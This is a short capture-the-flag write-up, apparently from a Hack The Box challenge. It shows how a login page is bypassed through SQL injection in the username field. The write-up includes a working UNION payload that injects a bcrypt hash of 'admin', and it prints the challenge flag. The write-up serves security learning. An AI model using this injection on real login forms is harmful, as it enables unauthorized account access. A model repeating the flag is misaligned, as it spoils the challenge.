# KORP Terminal - Very Easy

In this challenge, participants are provided with a website with login page.

![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/b6a30831-85e9-4335-8ba8-9b35064661a6)

## Solution

There is a SQL Injection in `username` parameter. After further identification, this is possibility query that used in the code:
```
SELECT password FROM users WHERE username = 'input_username'
```

With this query we can use `union` operator to return the SQL query result with our controlled input.


```
POST / HTTP/1.1
[..snip..]


username='+union+select+'$2a$12$GFiVKhImwWDr86Ix3t88A.StIYrFA39Xtpe4mQSqtAwySYy.8p57O'--+-&password=admin
```

`$2a$12$GFiVKhImwWDr86Ix3t88A.StIYrFA39Xtpe4mQSqtAwySYy.8p57O` is bcrypt result of `admin`

![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/c76c0480-eea1-4c1b-9444-dfcf6ebec2cb)



## Flag
HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}
